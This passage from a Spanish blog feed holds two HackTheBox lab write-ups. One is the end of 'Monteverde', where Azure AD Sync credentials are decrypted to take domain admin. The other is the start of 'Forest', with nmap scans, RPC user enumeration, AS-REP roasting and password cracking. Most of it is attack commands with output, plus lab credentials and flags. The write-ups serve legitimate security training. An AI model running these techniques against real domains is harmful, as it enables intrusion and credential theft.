&lt;p&gt;Si listamos los grupos a los cuales pertenece el usuario &lt;code&gt;mhope&lt;/code&gt;, podemos notar que esta dentro del grupo &lt;code&gt;Azure admins&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\Users\mhope\Desktop&amp;gt; whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cuando un usuario pertenece a un grupo &lt;code&gt;Azure&lt;/code&gt; debemos de dirigirnos al directorio raiz, y dentro buscar directorios relacionados a &lt;code&gt;Azure&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\Users\mhope\Desktop&amp;gt; cd C:\
*Evil-WinRM* PS C:\&amp;gt; dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         1/3/2020   5:28 AM                Program Files
d-----         1/2/2020   2:39 PM                Program Files (x86)
d-r---         1/3/2020   5:24 AM                Users
d-----       10/25/2022   2:29 AM                Windows


*Evil-WinRM* PS C:\&amp;gt; cd Progra~1
*Evil-WinRM* PS C:\Program Files&amp;gt; dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Curiosamente vemos uno de nombre &lt;code&gt;Microsoft Azure AD Sync&lt;/code&gt;, y si investigamos un poco, encontramos un exploit de escalada de privilegios, que lo que hace concretamente es dumpear las credenciales del administrador del dominio.&lt;/p&gt;

&lt;p&gt;Te dejo aqui el articulo para que veas mas al respecto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/&quot;&gt;https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo que tenemos que hacer primero es descargarnos el &lt;code&gt;AdDecrypt.zip&lt;/code&gt; del repositorio de &lt;code&gt;github&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/VbScrub/AdSyncDecrypt/releases&quot;&gt;AdSyncDecrypt - releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo descomprimimos y dentro vamos a tener dos archivos los cuales tenemos que subir a la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 AdDecrypt.zip   azure.xml   credentials.txt   users.txt
❯ unzip AdDecrypt.zip
Archive:  AdDecrypt.zip
  inflating: AdDecrypt.exe           
  inflating: mcrypt.dll              
❯ ls
 AdDecrypt.exe   AdDecrypt.zip   azure.xml   credentials.txt   mcrypt.dll   users.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos creamos un directorio y subimos los archivos, lo que yo hare es que con &lt;code&gt;smbserver&lt;/code&gt; crearme un recurso compartido para subirlos, pero puedes hacerlo como quieras.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\Users\mhope\Desktop&amp;gt; mkdir Privesc
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&amp;gt; copy \\10.10.16.10\smbFolder\AdDecrypt.exe AdDecrypt.exe
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&amp;gt; copy \\10.10.16.10\smbFolder\mcrypt.dll mcrypt.dll
*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&amp;gt; dir

    Directory: C:\Users\mhope\Desktop\Privesc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/13/2020   9:11 PM          14848 AdDecrypt.exe
-a----        1/12/2020   6:33 PM         334248 mcrypt.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente debemos ejecutar el siguiente comando &lt;code&gt;AdDecrypt.exe -FullSQL&lt;/code&gt;, pero debemos hacerlo desde el siguiente directorio &lt;code&gt;C:\Program Files\Microsoft Azure AD Sync\Bin&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora recordemos que debemos ejecutar el &lt;code&gt;AdSyncDecrypt.exe&lt;/code&gt; desde la ruta donde lo subimos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&amp;gt; C:\Users\mhope\Desktop\Privesc\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos las credenciales administrativas &lt;code&gt;administrator:d0m@in4dminyeah!&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos como el usuario &lt;code&gt;administrator&lt;/code&gt; con &lt;code&gt;Evil-WinRM&lt;/code&gt; y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.172 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
6154d420f50cd70c919a6fb1e96e56fc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y listo maquina finiquitada! 😆&lt;/p&gt;
</description>
        <pubDate>Fri, 13 Oct 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Monteverde</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Monteverde</guid>
        
        <category>Active Directory</category>
        
        <category>RPC Enumeration</category>
        
        <category>Crackmapexec Brute Force</category>
        
        <category>Abusing WinRM</category>
        
        <category>Abusing Azure Admins Group</category>
        
        <category>Azure AD Sync</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Forest - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Forest&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad facil, en esta ocasión vamos a enfrentarnos contra un &lt;code&gt;DC&lt;/code&gt; donde enumeraremos usuarios a traves de &lt;code&gt;rpc&lt;/code&gt; y mediante un &lt;code&gt;As-RepRoast attack&lt;/code&gt; solicitando un &lt;code&gt;TGT&lt;/code&gt; obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por &lt;code&gt;winrm&lt;/code&gt; a el equipo; despues enumerando el sistema con &lt;code&gt;Bloodhound&lt;/code&gt; nos aprovecharemos de los permisos del grupo &lt;code&gt;Account Operators&lt;/code&gt; para crear un usuario en el dominio y efectuar un &lt;code&gt;Dcsync attack&lt;/code&gt; donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Forest
❯ ls

 Forest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=113 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.161/113.161/113.161/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 11:56 -05
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.161 [65535 ports]
Nmap scan report for 10.10.10.161
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-09 11:56:58 -05 for 21s
Not shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49934/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
           Raw packets sent: 104093 (4.580MB) | Rcvd: 86582 (3.463MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Nmap 7.93 scan initiated Mon Oct  9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49934/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-10-09T10:06:39-07:00
| smb2-time: 
|   date: 2023-10-09T17:06:35
|_  start_date: 2023-10-09T14:03:53
|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78.92 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;KERBEROS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;NETBIOS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;389&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows Server 2016 Standard&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3268&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto, con &lt;code&gt;crackpamexec&lt;/code&gt; podemos tratar de enumerar a lo que nos enfrentamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;Windows Server 2016&lt;/code&gt; y que el &lt;code&gt;smb&lt;/code&gt; esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.161 htb.local&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora al tratarse de un &lt;code&gt;Domain Controller&lt;/code&gt; podemos tratar de enumerar usuarios validos con &lt;code&gt;rpclient&lt;/code&gt; a traves de un &lt;code&gt;null session&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tenemos un listado potencial de usuarios, podemos tratar de efectuar un &lt;code&gt;ASREProast Attack&lt;/code&gt; para tratar de obtener un &lt;code&gt;TGT - ticket granting ticket&lt;/code&gt; que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py -no-pass -usersfile users htb.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a crackear el hash y obtenemos unas credenciales &lt;code&gt;svc-alfresco:s3rvice&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2023-10-11 14:27) 0.1510g/s 617184p/s 617184c/s 617184C/s s521379846..s3r2s1
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos las credenciales y como el puerto &lt;code&gt;5985&lt;/code&gt; se encuentra abierto podemos tratar de conectarnos por &lt;code&gt;winrm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
